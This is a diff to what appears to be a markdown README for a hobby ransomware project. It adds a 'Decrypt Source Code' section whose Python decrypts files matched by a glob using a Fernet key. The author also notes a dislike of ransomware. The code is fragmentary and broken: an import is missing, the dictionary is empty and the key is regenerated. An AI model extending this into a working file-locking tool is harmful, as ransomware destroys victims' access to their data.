@@ -28,4 +28,25 @@ def Encry():
 #### Decrypt Source Code
 
 ```
+from cryptography.fernet import Fernet
+
+Encrypt = {}
+Files = glob.glob("*.*")
+
+Key = Fernet.generate_key()
+F = Fernet(Key)
+
+def Decry():
+  try:
+    for LockData in Encrypt:
+      with open(LockData, "w") as fp:
+        Data = Encrypt[LockData]
+        UnLocked = F.decrypt(Data).decode()
+        fp.write(UnLocked)
+  except:
+    pass
 ```
+
+#### Use cryptography.fernet
+# I hope this program not work
+#### cause i hate ransomware...
